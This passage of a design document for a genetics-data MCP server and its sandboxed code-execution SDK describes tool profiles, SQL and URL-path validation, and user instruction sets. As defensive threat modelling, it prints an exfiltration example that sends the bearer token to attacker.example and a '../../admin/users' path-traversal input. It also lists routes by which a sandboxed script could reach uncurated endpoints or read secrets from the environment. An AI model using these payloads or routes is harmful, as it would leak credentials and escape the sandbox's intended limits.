  O_NOFOLLOW` and checks **that descriptor** — `readlink("/proc/self/fd/<dirfd>")` must sit
  under `_ARTIFACTS_DIR_PREFIX` and must not be `" (deleted)"` — rather than re-resolving
  the path;
- the artifact is opened **relative to that fd** (`dir_fd=`) with `O_RDONLY | O_NOFOLLOW |
  O_NONBLOCK`, so a later directory swap changes a name the read no longer uses;
- regular-file, link-count and content all come from that one fd's `fstat`. `O_NOFOLLOW`
  refuses a symlink at the final component; `st_nlink != 1` refuses a hardlink, which has
  nothing to resolve and so passes both path layers while pointing at an out-of-tree inode;
  `O_NONBLOCK` is what makes the FIFO case reachable at all — `O_RDONLY` on a writerless
  FIFO blocks in the kernel before `S_ISREG` is tested, so a script could hang the chat
  backend with one `mkfifo` in its own artifacts directory.

The reported `size` is the payload length, not `st_size`, so a file that grows mid-read
cannot report a size that disagrees with the bytes returned. Every failure — outside the
allow-list, symlink, hardlink, FIFO, directory swap, `OSError` — is reported as "not
found", so probing discloses nothing, and the oversize refusal omits the byte count so it
is not a size oracle. A `_validate_path` refusal does return measurably faster than one
from the open, which tells a caller whether a name **it planted** is an out-of-tree
symlink; a dangling symlink takes the same fast path, so it is not an existence oracle.

**Not implemented**: cross-execution scoping. `read_artifact` takes no session or execution
argument, so which execution's artifacts are reachable rests entirely on
`SANDBOX_ARTIFACTS_DIR` pointing at the right directory. Resolving a name against a session
belongs to `4h6.11`.

#### Open Targets Platform MCP

| Tool | Description |
|------|-------------|
| `get_open_targets_graphql_schema` | Retrieve the Open Targets Platform GraphQL schema for query construction |
| `search_entities` | Search for targets, diseases, drugs, variants, and studies by name |
| `query_open_targets_graphql` | Execute GraphQL queries against the Open Targets Platform API |
| `batch_query_open_targets_graphql` | Execute the same GraphQL query with multiple variable sets |

## Tool Profiles

The chat API supports a `tool_profile` parameter that controls which tool categories are available per request. This enables A/B testing of different tool strategies (API vs BigQuery vs RAG) by sending identical prompts with different profiles.

### Tool categories

Each tool has a `category` field in its definition:

| Category | Description |
|----------|-------------|
| `general` | Always available: search_phenotypes, search_genes, lookup_variants_by_rsid, lookup_phenotype_names, list_datasets, get_resource_metadata, get_dataset_display_names, search_scientific_literature, web_search, search_mgi, search_cbioportal, get_protein_annotations, map_protein_variants, get_variant_protein_effect, search_uniprot, create_phewas_plot, get_gene_group_members, normalize_gene_symbols |
| `api` | Local genetics API tools: credible sets, gene data, colocalization, phenotype report, variant annotations, etc. |
| `bigquery` | BigQuery SQL tools: query_database, get_database_schema |
| `orchestration` | Main-agent-only tools: launch_subagents, list_capabilities, read_artifact. `subagent.py` drops all three **by name** (the category is in the `api` and `bigquery` profiles, so it is not itself an exclusion), to prevent recursive launches and to keep a subagent away from another execution's artifacts. |

### Profile behavior

| `tool_profile` value | Local tools | External tools |
|----------------------|-------------|----------------|
| `null` (default) | general + api + bigquery + orchestration | always-on (gnomAD, OT) + RAG |
| `"api"` | general + api + orchestration | always-on only |
| `"bigquery"` | general + bigquery + orchestration | always-on only |
| `"rag"` | general only | RAG only |

Always-on external servers (gnomAD, Open Targets from `EXTERNAL_MCP_SERVERS`) are included in every profile except `"rag"`. The RAG server (`RAG_MCP_SERVER`) is only included when `tool_profile` is `"rag"` or unset.

## Genetics SDK (`genetics_mcp_server.sdk`)

An importable data-access package sitting **over** `ToolExecutor`, for code that consumes
genetics data programmatically rather than through a tool schema. It is the data half of the
code-execution agent: a script in the sandbox imports it instead of the agent calling the
API-category tools one at a time. It wraps 40 of the 44; the four `api`-category tools it does
**not** wrap are `get_phenotype_report`, `get_credible_sets_stats`, `analyze_variant_list` and
`get_myvariant_annotations`. The "Deliberately **not** in the SDK" section below gives the
reasoning, but it is written across categories — its list also names `general`-category tools
such as `create_phewas_plot`, which was never one of the 44 — so it is not a substitute for
the four named here.

The four are excluded deliberately, but not for one shared reason, and the axis that separates
them is **not** whether the endpoint computes something server-side. It is whether the rows the
answer is built from sit somewhere a sandboxed script can read.

`analyze_variant_list` is a rollup over endpoints the SDK already wraps, so a script composes it
from primitives. `get_credible_sets_stats` aggregates nothing server-side at all — results-api
streams a pre-generated TSV out of GCS, the same storage pattern as the phenotype report — yet
its underlying rows are `credible_sets_v`, which `sql()` reaches, so a script can compute the
same class of counts itself. Read "itself" strictly: the view carries the PIP, effect-size and
consequence columns the counts are built from, but the upstream's risk/protective convention
(taking the sign of the lead variant's beta is an inference, not a documented rule) and which
consequence terms it treats as coding versus loss-of-function are published nowhere the script
can see. Expect a script to produce defensible statistics, not necessarily *these* numbers.

`get_myvariant_annotations` is the one genuine unavailability: it targets a third-party host,
and no third-party target is permitted by the sandbox egress policy, so a wrapper for it would
be a function that cannot connect. `get_phenotype_report` is **not** in that class, and an
earlier version of this passage was wrong to put it there. Its gene scores and tier assignments
exist in no allow-listed view, so a script cannot recompute them — but results-api is a
permitted egress target, results-api is what serves the markdown, and the sandbox's credential
is not scoped per route, so the document is reachable from a script by a hand-rolled HTTP call.
What the SDK's omission costs is the affordance, not the data: neither the SDK nor the sandbox
stubs name that route, so a model would have to invent the request rather than call something
put in front of it. That is a discoverability and convenience asymmetry, not an availability
one, and inventing the call is not the intended way to use the sandbox.
`genetics-results-suite-4h6.23` should still exclude or explicitly book questions that lean on
either tool — but for those two different reasons, and without scoring the code-execution arm
down as though both were unreachable. The egress allow-list and the credential's scope are
specified and maintained in `genetics-results-suite` `docs/code-execution-security.md`; treat
that document as the authority for both rather than the summary here, which will age.

```python
import genetics_mcp_server.sdk as genetics
import polars as pl

df = genetics.credible_sets(gene="IL7R")
df.filter(pl.col("pip") > 0.5).join(genetics.mpra(gene="IL7R"), on="variant")
```

The MCP and chat tool surfaces are unchanged and still call `ToolExecutor` directly; the SDK
is an additional entry point, not a replacement.

### The grid collapse

The by-gene / by-variant / by-region / by-phenotype split that produced the near-duplicate
tool names is an **argument** here, not a function name. `_one_of()` in `sdk/client.py`
enforces that exactly one selector is supplied and refuses ambiguity rather than picking a
winner.

| SDK function | Executor methods it dispatches to |
|---|---|
| `credible_sets(gene=\|qtl_gene=\|variant=\|region=\|phenotype=[, credible_set_id=, leads_only=])` | `get_credible_sets_by_gene`, `_by_qtl_gene`, `_by_variant`, `_by_region`, `_by_phenotype`, `get_credible_set_by_id`, `get_credible_set_leads_by_phenotype` |
| `colocalization(variant=\|credible_set_id=+phenotype=)` | `get_colocalization`, `get_colocalization_by_credible_set` |
| `exome(gene=\|variant=\|region=\|phenotype=)` | `get_exome_results_by_gene`/`_variant`/`_region`/`_phenotype` |
| `gene_burden(gene=\|phenotype=)` | `get_gene_based_results`, `get_gene_based_results_by_phenotype` |
| `hla(phenotype=\|allele=)` | `get_hla_by_phenotype`, `get_hla_by_allele` |
| `asm_qtl(variant=\|gene=)` | `get_asm_qtl_by_variant`, `get_asm_qtl_by_gene` |
| `open_chromatin(variant=\|region=\|peak=\|gene=)` | `get_open_chromatin_by_variant`/`_region`/`_peak`/`_gene` |
| `peak_to_gene(peak=\|gene=)` | `get_peak_to_genes`, `get_gene_to_peaks` |
| `variant_effect(variant=\|gene=)` | `get_variant_effect_by_variant`, `_by_gene` |
| `mpra(variant=\|region=\|gene=)` | `get_mpra_by_variant`/`_region`/`_gene` |
| `mpra_pip_concordance(gene)` | `get_mpra_pip_concordance_by_gene` |
| `variant_annotation(variant=\|region=\|gene=\|variants=)` | `get_variant_annotations` (already collapsed) |
| `gene_annotations(region=\|nearest_to=\|group=)` | `get_genes_in_region`, `get_nearest_genes`, `get_gene_group_members` |
| `expression(gene)` | `get_gene_expression` |
| `gene_disease(gene)` | `get_gene_disease_associations` |
| `summary_stats(phenotypes=, variants=\|region=)` | `get_summary_stats`, `get_summary_stats_by_region` |
| `ld(variant[, other])` | `get_variants_in_ld`, `get_ld_between_variants` |
| `search(query=[, kind=]\|rsids=)` | `search_phenotypes`, `search_genes`, `lookup_variants_by_rsid` |
| `lookup_phenotype_names(codes)` | `lookup_phenotype_names` |
| `get_dataset_display_names()` | `get_dataset_display_names` |
| `normalize_gene_symbols(symbols)` | `normalize_gene_symbols` |
| `sql(query)` | `query_database` |
| `schema()`, `resources()`, `datasets()` | `get_database_schema`, `get_available_resources`, `list_datasets` |

`mpra_pip_concordance` stays a separate function rather than a keyword on `mpra()`: it is a
join of `credible_sets_v` and `mpra_v` and returns credible-set columns alongside MPRA
columns, so the row shape differs from every other `mpra()` result.

`hla()` is the one collapse whose two branches read **different stores**. `hla(phenotype=)`
reads the per-phenotype tabix files through results-api; `hla(allele=)` must go to BigQuery
`hla_associations_v` — no single file spans phenotypes. They nevertheless spell the
statistics the **same way**: `mlog10p`/`se`/`af`/`af_cases`/`af_controls`, so per-column
access is uniform and no renaming is ever needed. The column *sets* still differ:
`hla(allele=)` selects the 11 columns common to both, while `hla(phenotype=)` returns those
plus `resource`, `version`, `chr` and `pos` — 15 in all — so a bare `pl.concat` of the two
still fails on width and the shared 11 have to be selected explicitly first. The name
agreement is not free — `hla_associations_v`
renames FinnGen's native `mlogp`/`sebeta`/`af_alt`/`af_alt_cases`/`af_alt_controls` in the
view definition (`genetics-results-db/schemas/hla_associations_v.sql`); the staged file and
the `hla_associations` table underneath still carry the native spelling. The rename is 1:1
on byte-identical values, and the view is what every consumer reads. The trait column is
`phenotype` in both branches, a third convention next to the `trait`/`phenocode` used
elsewhere in the suite; `hla_associations_v` has no `trait` or `trait_original` at all. Both branches
preserve column names on an empty result: the `allele=` branch via the
`with_metadata=True` / `columns` path the BigQuery functions use, the `phenotype=` branch
via the `X-Columns` response header results-api added for
`genetics-results-suite-6uk` (see "Empty results keep their schema").

Deliberately **not** in the SDK: the external/third-party tools (literature, web search, MGI,
cBioPortal, myvariant, UniProt), the presentation tools (`create_phewas_plot`,
`analyze_variant_list`, `get_credible_sets_stats`) and `get_phenotype_report`. The first group is
not genetics-results data; the second is model-facing summarisation that a script writes for
itself. `get_phenotype_report` sits next to that second group but does not belong to it: its gene
scores and tier flags are in no view a script can query, so a script cannot write the report for
itself — it can only fetch the document results-api serves.

**"Not in the SDK" does not mean "not reachable", and this list is not an enforcement boundary.**
`GeneticsClient` keeps the full `ToolExecutor` on `._executor` — and reaching it needs no client
at all: `tools/executor.py` is on `sandbox/prune_venv.py`'s `SDK_ALLOWLIST` (it ships because
`sdk/client.py` imports `ToolExecutor` directly), so a sandboxed script can simply
`from genetics_mcp_server.tools.executor import ToolExecutor` and construct its own. httpx ships
too, as the SDK's own transport. The leading underscore is **curation, not enforcement**: it marks
the executor as outside the curated surface so that a reader or a model does not treat it as a
recommended entry point, and it should never be cited as a control. The containment boundary, **as
specified**, is the sandbox's deny-by-default **network egress allow-list** (db-api and results-api
only) in `genetics-results-suite` `docs/code-execution-security.md` — specified rather than live:
the sandbox is not deployed, and that policy stays decoration until `genetics-results-suite-4h6.7`
ships a Deployment carrying the labels it selects.

Reachability therefore divides this list along a different axis than the one that put tools on
it. The third-party tools **are** genuinely unreachable from a sandboxed script — but for the
network reason, not the SDK one: no permitted egress target serves myvariant.info, Europe PMC,
MGI, cBioPortal, UniProt or a web-search API (Perplexity/Tavily), so reaching
`get_myvariant_annotations` through `._executor` still fails to connect. The presentation tools and `get_phenotype_report` are **reachable**: results-api is a
permitted target and the sandbox credential is not scoped per route, so `._executor` or a
hand-rolled httpx call gets them. For those, what the omission costs is the affordance and not
the data — the discoverability and convenience asymmetry the SDK coverage passage above
describes, not an availability one. Same list, two different reasons, and the reason is the
point (`genetics-results-suite-4h6.33`).

`credible_sets`, `summary_stats` and `gene_burden` all return trait **codes** (`I9_CHD`), and
`search(kind="phenotypes")` is the fuzzy ranked index rather than a lookup, so
`lookup_phenotype_names` and `get_dataset_display_names` are the code→name resolvers.
`normalize_gene_symbols` returns **one row per input** with `input`/`symbol`/`resolved`/
`matched_on`, so the unresolved inputs are rows with a null `symbol`
(`df.filter(pl.col("symbol").is_null())`) rather than a second list that a DataFrame cannot
carry — without it a script cannot canonicalise a user-supplied gene list before calling
`credible_sets(gene=...)`.

### Contract

- **Return type is `polars.DataFrame`** for every row-returning function. Scripts filter and
  join, which is what a DataFrame is for, polars is already a dependency, and it is already
  what `executor.py`'s own summarisers use. `schema()`, `resources()` and `datasets()` return
  dicts because their payloads are nested rather than tabular.
- **Failures raise `GeneticsError`**; argument-shape mistakes raise `GeneticsUsageError`. The
  tool layer's `{"success": False, "error": ...}` exists because a model reads the dict; a
  script author does not check a flag after every call, and an unchecked failure would
  otherwise read as an empty frame.
- **No knowledge of HTTP required, and no way to redirect it.** Endpoints come from the
  environment (`GENETICS_API_URL`, `GENETICS_PUBLIC_API_URL`, `BIGQUERY_API_URL`) and
  credentials from `INTERNAL_API_SECRET`. Neither `configure()` nor `GeneticsClient()` accepts
  a URL: the client attaches the internal bearer token to **both** the results-api and the
  db-api client, so a caller-supplied base URL would be a one-line credential exfiltration
  (`genetics.configure(api_base_url="http://attacker.example/api"); genetics.expression("APOE")`).
  `configure()` raises `GeneticsUsageError` on any URL setting. **This is a mitigation, not the
  answer** — per `genetics-results-suite/docs/code-execution-security.md`, a script that can
  `import` the SDK can also read `os.environ`, so the sandboxed SDK must eventually carry a
  short-lived scoped token rather than `INTERNAL_API_SECRET` at all (tasks `.9` / `.14`).
  `_download_url` / `_download_data` are dropped — a script already holds the rows.
- **No inline row cap.** `ToolExecutor._row_limit` caps region results at 500 to protect the
  model's context window; `GeneticsClient` passes `row_limit=None` to the executor **it
  constructs**. An injected executor is never mutated: it may be the running service's shared
  one, and lifting its cap in place would flood the model's context at every MCP call site
  that relies on `_cap_rows`.
- **Truncation raises rather than returning a prefix.** Silent truncation is the one failure a
  script cannot detect — the frame is well-formed and merely missing rows, so every downstream
  count, mean and join is wrong with no signal. `_check_truncation` turns `truncated` /
  `download_capped_at_100k` into a `GeneticsError`.
- **Rows are named from the payload's own columns.** results-api returns JSON objects; db-api
  returns rows **positionally**, with names in a separate `columns` key. Handing positional
  rows to `pl.from_dicts` does not raise — it transposes them into `column_0`/`column_1` with
  every value stringified — so `_frame()` switches constructor on whether `columns` is present,
  and an empty result with `columns` keeps its schema so `.filter(pl.col(...))` still works.
  When `columns` is present but the rows are already dicts (the five by-gene tools, which now
  name their rows for the model), they are re-flattened against `columns`, so column order and
  schema come from `columns` in every case rather than from dict iteration order.
- **A branch that cannot honour an argument refuses it.** Dropping a filter silently is worse
  than rejecting it: `exome(gene=..., resources=[...])` that ignores `resources` returns *more*
  rows than asked for and the frame says nothing. `_reject()` raises `GeneticsUsageError` in
  eight functions — re-derive from `grep -n '_reject(' src/genetics_mcp_server/sdk/client.py`
  rather than trusting this list: `credible_sets` (any selector alongside `credible_set_id`;
  `window` off the gene branch, `coding_only` off region, `leads_only` off phenotype,
  `data_types` on region/phenotype), `colocalization` (`variant` alongside `credible_set_id`;
  `resource`/`dual_format` on the `variant=` branch), `exome` (`resources` on gene/phenotype,
  `resource` off phenotype), `gene_burden` (`resource` on the gene branch), `hla`
  (`min_mlogp`/`min_info`/`limit` on the `phenotype=` branch, `genes` on `allele=`),
  `gene_annotations` (`n`/`max_distance` off nearest_to, `exclude_olfactory` off group,
  `gencode_version` on group), `ld` (`window` when `other` is given) and `search`
  (`query`/`limit` alongside `rsids`).
- **Sync by default.** Module-level functions are synchronous wrappers that run the coroutine
  on a dedicated background event loop (`sdk/_runner.py`), which keeps the HTTP connection pool
  warm across calls and works from inside an already-running loop. `GeneticsClient` exposes the
  same functions as awaitables.
- **Importable standalone.** Nothing under `sdk/` imports the chat backend, the LLM service,
  the MCP server or the SQLite databases, so the package can be installed into a sandbox image
  on its own. `test_sdk.py` asserts this in a subprocess.
- **The import closure is pinned, because the sandbox image ships exactly it.** That image
  installs this distribution and then deletes every `genetics_mcp_server` file outside the
  closure — a prompt-injected script *reads* source, it does not need it to import. The closure
  is eleven modules: the package `__init__`; `sdk/{__init__,_runner,client,errors}`;
  `tools/{__init__,definitions,executor,phewas_categories,sql_safety,uniprot}`.
  `config/settings.py` was in it until `genetics-results-suite-l41` — it names every internal
  environment variable of the suite — so `uniprot.py` now imports `Settings` under
  `if TYPE_CHECKING` and `ToolExecutor` resolves settings through `_resolve_settings()` at
  first use rather than in `__init__`, falling back to `_PrunedInstallSettings` (a frozen copy
  of the four public-URL/TTL defaults, and an empty `internal_api_secret`, since a sandbox
  holds no secret) when `config.settings` is *itself* not installed — a `ModuleNotFoundError`
  naming anything else in its import chain is re-raised, so a broken install cannot degrade
  into the credential-less fallback, and taking the fallback logs one warning naming no
  variable. `uniprot`, `base_url`, `public_url` and `bigquery_url` are `cached_property` for
  the same reason; `client` is a lock-guarded lazy property rather than a `cached_property`
  because 3.12 dropped that descriptor's lock and the service shares one executor across
  threads, so a race would leak the loser's connection pool past `close()`. Assigning over
  any of them in a test still works.
- **The endpoint reads must stay behind the settings resolution.** `config/settings.py` calls
  `load_dotenv()` at module scope, so the `GENETICS_API_URL` / `GENETICS_PUBLIC_API_URL` /
  `BIGQUERY_API_URL` reads only see a `.env` file once that module has been imported. They go
  through `_endpoint_env()`, which resolves settings first — reading `os.environ` directly at
  construction would put a standalone run (`scripts/analyze_variants.py`, the SDK outside the
  service) on the hard-coded default URL while still attaching a `.env`-supplied secret to it,
  and would silently disable the BigQuery tools. `test_sdk_import_closure.py` pins this.
- `test_sdk_import_closure.py` measures the closure in a fresh interpreter and asserts
  equality, and asserts the SDK imports with `dotenv` unavailable. Every probe forces `src/`
  onto the subprocess `PYTHONPATH` and asserts `genetics_mcp_server.__file__` resolves under
  it, so an editable install pointing at another checkout cannot make it measure the wrong
  tree. Widening the closure means widening `SDK_ALLOWLIST` in
  `genetics-results-suite/sandbox/prune_venv.py` in the same change, or the image build fails.

### SQL safety at the SDK boundary

Five executor methods have no results-api endpoint and build BigQuery SQL themselves
(`get_asm_qtl_by_gene`, `get_open_chromatin_by_gene`, `get_variant_effect_by_gene`,
`get_mpra_by_gene`, `get_mpra_pip_concordance_by_gene`). The db-api's `/query` endpoint accepts
`{sql, max_rows, dry_run}` — **a SQL string with no parameter-binding channel** — so a value
cannot be bound and must be validated before it is spliced in.

`tools/sql_safety.py` is the single place that happens. It is an allow-list, not escaping:
`quote_literal()` accepts a value only if every character is in `[A-Za-z0-9_.@:/+-]` (≤128
chars), which excludes quotes, the backslash escape, the statement separator, whitespace and
parentheses, so an accepted value cannot terminate the literal it sits in. `normalize_literal()`
returns the same validated value **unquoted**, for the callers that also reuse it outside SQL
(the `"gene": gene` echo field, the `filename=f"{gene}_mpra.tsv"` download name that
`chat_api.py` interpolates into a `Content-Disposition` header) — validation runs on the
stripped value, so the raw argument can still carry CR/LF the allow-list never saw.
`sql_int()` and `sql_float()` coerce through `int()`/`float()` with range checks, so a numeric
slot never receives a string at all, and parenthesise a **negative** token so `g.gstart -
{token}` cannot render `gstart--5` (a line comment) if the f-string's space ever disappears;
positive tokens stay bare because BigQuery's `LIMIT` takes a literal, not an expression.
`_gene_window_cte()` renders the shared gene-span CTE from an already-validated literal.

A rejected value returns the executor's normal `{"success": False, "error": ...}` and the query
is never issued. This is defence in depth over the db-api's own `authorize_query`, which
already rejects anything that is not a plain SELECT over the exposed views.

The same five methods gained a `limit` argument (bounded at 100k) so the SDK can raise the
statement's `LIMIT` without a second code path, and the validated token is coerced back with
`int()` before it reaches `query_database(max_rows=...)` — `sql_int` accepts `500.0`, and a
float `max_rows` makes `all_rows[:max_rows]` raise `TypeError` on any result larger than the
limit, surfacing as the generic internal-error message. `limit` defaults to `MAX_ROWS` in the
SDK rather than 500: **it is a display bound, not a work or transfer bound.** `query_database`
calls `_strip_trailing_limit()` and then fetches `max(max_rows, 100_000)`, so the builders'
trailing `LIMIT` never reaches BigQuery — the join and `ORDER BY` run in full regardless, and a
low `limit` buys nothing but a positional prefix of an ordered result.

**Each consumer of these five results gets the shape it can actually use** (`_bq_gene_payload`).
db-api returns rows positionally with the names in a separate `columns` key, and both consumers
used to be handed the bare `rows`:

- `results`, which goes to the **model**, is a list of **dicts** built by zipping `columns` with
  each row. The model was previously shown `[["19", 44908822, 12.3], …]` — values with no names,
  so ASM-QTL, open-chromatin, variant-effect and MPRA by-gene answers were guesswork. This set is
  capped, so building dicts is cheap.
- `_download_data` uses the `{"columns", "rows", "filename"}` form, which `_convert_to_tsv`
  already has a branch for. Passing a list of lists under `results` instead hit that function's
  `results[0].keys()` and raised `AttributeError` inside `_process_download_hints`' `except`, so
  **the download link silently vanished** (that swallowing is fixed — see "Downloadable results"
  below — and the same mistake now raises `DownloadShapeError`). The positional form is also the
  right one here: the download carries up to 100k rows and would be flattened back anyway.

Names always come from `columns` positionally, never from dict iteration order, and a row whose
arity disagrees with `columns` — or that is not a positional sequence at all — makes the tool
return `success: False` rather than label genomic values with the wrong column names. That
validation lives in `_positional_rows`, shared rather than duplicated.

`get_hla_by_allele` is the sixth BigQuery-backed tool and had both defects independently: it
landed in parallel with the fix above, so it shipped bare positional lists to the model and a
dead download link. It now shapes its payload the same way — named dicts in `results`, the
`{columns, rows}` form in `_download_data`, and the same loud failure on a mismatch — through
`_positional_rows`. It keeps its own payload builder rather than calling `_bq_gene_payload`
because it is keyed on `allele`/`resource`/`min_mlogp`/`min_info`/`count`, not on `gene`.

They also take `with_metadata=False`. When set, the returned dict carries the underlying query's
`columns` and `truncated`. Both are still needed after the shape change: an **empty** result has
no row to carry names, and `_frame()` builds `pl.DataFrame({c: [] for c in columns})` so a script
filtering a no-hit gene gets an empty frame instead of `ColumnNotFound`; `truncated` is what
`_check_truncation` raises on. It stays opt-in so the model's payload is not padded with either.

### Empty results keep their schema

A sandboxed script filters whatever frame it gets, so an empty result that has lost its
column names turns an ordinary no-hit query into `ColumnNotFoundError` and costs a retry
iteration (`genetics-results-suite-6uk`). The two backends get there differently:

- **db-api** carries `columns` from the BigQuery job schema, which exists for a zero-row
  result. Covered by `with_metadata=True` above.
- **results-api** returns a bare JSON array, so an empty one is `[]` with no schema at all.
  It now advertises the served file's own header line in an **`X-Columns` response header**
  (one change in that repo's `range_response`, covering all 11 JSON-range routers).
  `ToolExecutor._columns_meta` lifts it into a `column_names` key on the result dict.

`_columns_meta` returns a **dict to splice with `**`** and is gated on
`ToolExecutor(expose_columns=True)`, which only `GeneticsClient` passes: a tool result dict
*is* the MCP tool payload and the chat backend's model input, and this epic freezes both, so
with the flag off — or on an endpoint that does not advertise (search, gene annotations,
gene groups, rsID lookup, LD, gene-disease, gene-based/gene-burden results) — the dict is byte-identical
to before. An **injected** executor keeps whatever it was built with, so an empty
results-api result through the running service's shared executor falls back to a bare frame
rather than silently changing that service's tool output.

`column_names` is deliberately **not** merged into db-api's `columns`. db-api's is required
to read positional rows; this one is advisory, because results-api's rows are already named
dicts. `_frame()` consults `column_names` only when the result is empty — routing a
non-empty results-api result through the positional constructor would give up
`pl.from_dicts`' `strict=False` fallback for the mixed-type columns upstream does produce.

Not covered: results-api endpoints outside the `range_response` family (search, gene
annotations, gene groups, rsID, LD, gene–disease) compute their JSON instead of streaming a
TSV, so they have no header to advertise and degrade to today's bare `pl.DataFrame()`.

### URL path segments

`sql_safety` guards the six SQL slots; the ~59 other caller-controlled values are interpolated
into **results-api URL paths** on `self.client`, which carries the internal bearer token. httpx
normalises `..`, so an unencoded segment is not a cosmetic problem: `mpra(variant=
"../../admin/users")` resolved to `http://api.internal:2000/api/v1/admin/users` with the secret
attached, and `variant="x?a=b#c"` appended an attacker-controlled query string — defeating the
typed surface entirely. `executor._seg()` (`quote(value, safe="")`, plus explicit encoding of
the bare `.`/`..` segments that `quote` leaves alone because `.` is unreserved) now wraps every
such segment, including the ones passed to `_build_download_url()`.

## Response Length

The chat API takes a `verbosity` parameter (`"brief"` — the default — or `"detailed"`), surfaced in the web UI as the **Answer** radio group beside the literature-backend and tool-profile selectors. `chat_api.stream_chat` appends the matching fragment from `_VERBOSITY_PROMPTS` (`config/defaults.py`, via `verbosity_prompt()`) to the end of the system prompt.

| `verbosity` value | Effect on the write-up |
|-------------------|------------------------|
| `"brief"` (default, and the fallback for null/unrecognized values) | Report the three-pass analysis as its conclusions: the answer, the rows that carry it, and interpretation-changing caveats. Retrieved-but-unused data is left to the `INCLUDE_IN_RESPONSE` download links, with a one-line note of what was held back |
| `"detailed"` | The full pass-by-pass write-up — complete data extraction, then literature, then analysis, with the per-source inventory |

**The setting scopes presentation, never method or rigor.** The three-pass approach under "Analyzing data" and every grounding rule apply identically at both settings; only the volume of what gets printed changes. An unrecognized value falls back to `"brief"` rather than raising, since a presentation preference must not fail a chat turn.

Both fragments sit inside the **shared** cached system block (block 0 — see "Instructions" below for the split), so each setting keeps its own prompt-cache entry instead of invalidating the other's. The setting is per-request, and `chat_messages.verbosity` records the value in force per message the same way `literature_backend`, `tool_profile` and `instruction_set_id` do — so reopening a conversation restores the answer detail it was last held under. The column carries the same `ON CONFLICT` full-row-replace semantics as its siblings: a save that omits it clears it.

## Instructions (user-authored system-prompt text)

A user can store several named sets of their own instructions ("I'm a statistician", "answer in
Finnish") and pick one per chat. UI label **Instructions**, code noun `instruction_set`. The
selected set's text is wrapped and appended to the system prompt as a second, separately cached
block. The browser surfaces it in two places (`../genetics-results-browser`): an **Instructions**
entry in the account menu opening `InstructionsDialog.tsx` (list / create / edit / archive /
per-set version history, with clonable example sets), and a compact selector in the chat options
row beside **Answer**.

### Data model (`llm_config.db`)

| Table | Shape |
|---|---|
| `user_instruction_sets` | One row per set — `id` (uuid4), `user_id`, `name`, `body`, `created_at`, `updated_at`, `archived_at`. Index `(user_id, archived_at, updated_at DESC)` |
| `user_instruction_set_history` | Append-only, one row per save — autoincrement `id`, `set_id`, `user_id`, `name`, `body`, `changed_at`, `comment`. Index `(set_id, changed_at DESC)` |

Unlike the tool-description and user-setting tables, which *are* their own history, a set has a
current row plus a separate history table. `archived_at` is a soft delete and **there is no hard
delete**: `chat_messages.instruction_set_id` lives in `chat_history.db`, a different SQLite file
where no foreign key can enforce the reference, so a `DELETE` would silently orphan it.

A one-shot migration in `_migrate_to_history_tables` hands each user their last version of the
retired per-user instructions feature (removed in 99fbdac; `user_instructions_history` is no
longer created for new databases and is deliberately not dropped) as a set named `Imported`,
keeping the original `changed_at` so it does not claim to be the user's newest edit. The guard is
per user — the row is imported only where that user holds *no* sets at all — so one user owning a
set cannot strand everyone else's legacy text, and idempotency survives archiving.

### Caps

| Cap | Value | On write |
|---|---|---|
| `INSTRUCTION_SET_MAX_BODY_CHARS` | 4000 | `InstructionSetBodyTooLong` → **413** |
| `INSTRUCTION_SET_MAX_PER_USER` | 20 | `InstructionSetLimitReached` → **409** |

Both are re-applied on read, because a stored row can predate a cap or survive it being lowered:
`list_instruction_sets` returns at most 20 rows, and `get_instruction_set` returns the full stored
body with `body_over_cap=true` rather than truncating it — the dialog reads that flag to explain
why saving the set back unchanged is rejected (`update` refuses an echoed-back over-cap body)
instead of looking broken. The chat path truncates instead of rejecting; see below.

### Endpoints

All under `/chat/v1`, all `Depends(auth_required)` and scoped to the authenticated caller
(`routers/llm_config.py`):

- `GET /chat/v1/llm-config/user/instruction-sets` — the caller's non-archived sets, most recently edited first
- `POST /chat/v1/llm-config/user/instruction-sets` — `{name, body, comment?}`; 400 on an empty name or body, 413 over the char cap, 409 over the count cap
- `PUT /chat/v1/llm-config/user/instruction-sets/{set_id}` — `{name?, body?, comment?}`, omitted fields keep their value; 400 empty, 413 over cap, **404** for a set that is not the caller's *or* is archived (an archived set is deleted as far as the user is concerned, so editing one must not report success)
- `DELETE /chat/v1/llm-config/user/instruction-sets/{set_id}` — archives, **204**; 404 as above
- `GET /chat/v1/llm-config/user/instruction-sets/{set_id}/history?limit=20` — versions newest first. Archived sets stay readable here, so history survives a delete

Status, detail string and response shape are identical for a foreign id and a nonexistent one on
all three id-taking endpoints, so the API leaks no evidence that another user's set exists;
ownership is checked *before* the length cap, so an over-cap body aimed at a foreign id still
404s rather than 413ing.

**Selection reuses the existing user-settings key** `selected_instruction_set`
(`GET`/`PUT`/`DELETE /chat/v1/llm-config/user/settings/{setting_key}`) — there is no separate
selection endpoint. Archiving a set does not clear that pointer; the client drops to *None* and
clears the setting when the stored id no longer lists, mirroring the server's ignore-unknown-id
rule. The other three chat options persist the same way, under `chat_verbosity`,
`chat_literature_backend` and `chat_tool_profile`; the "all" tool profile round-trips through the
literal `all` because the settings `PUT` rejects an empty `setting_value` with a 400. All four keys
hold the user's *default* — the value an explicit control interaction last wrote — while the
`chat_messages` columns hold what each conversation was actually held under, so reopening an old
conversation restores its options without changing what the next new chat starts from.

### Per-turn metrics (`chat_turn_metrics`)

One row per **completed** assistant turn, written by `_stream_anthropic` in the same block that
logs the `Chat complete:` line, so the log line and the row can never disagree. **The Anthropic
path only** — `_stream_openai` records nothing, so any aggregate over this table under-counts a
deployment that also serves OpenAI. It holds
`iterations`, `tool_call_count`, `input_tokens`, `output_tokens`, `cache_read_tokens`,
`cache_create_tokens`, `cost_usd`, `wall_ms`, `tool_profile`, `model` and `created_at`. Before it,
these numbers existed only in Cloud Logging and had to be recovered from the BigQuery log sink;
`chat_messages.content_json` is not a substitute, because it flattens a whole turn's blocks into
one assistant record, leaving parallel and sequential tool calls indistinguishable and roundtrips
per turn underivable.

- **Keying.** A surrogate `id`, plus `session_id` and `message_id` columns and a *partial* unique
  index on `message_id WHERE message_id IS NOT NULL`. `message_id` is the client-generated
  `chat_messages` primary key and is globally unique on its own, so it needs no `session_id` to
  disambiguate. Both ids are nullable and neither carries a foreign key — `PRAGMA foreign_keys` is
  ON here, so one would abort the insert: the row is written while the stream is still open,
  before the client POSTs the assistant message, and on a conversation's first turn before the
  session row exists at all (the browser creates the session only after the first exchange
  completes). `delete_session` therefore deletes these rows explicitly; the `chat_sessions`
  cascade does not reach them.
- **`user_id` scopes the upsert.** `message_id` arrives from the client and is unique only by
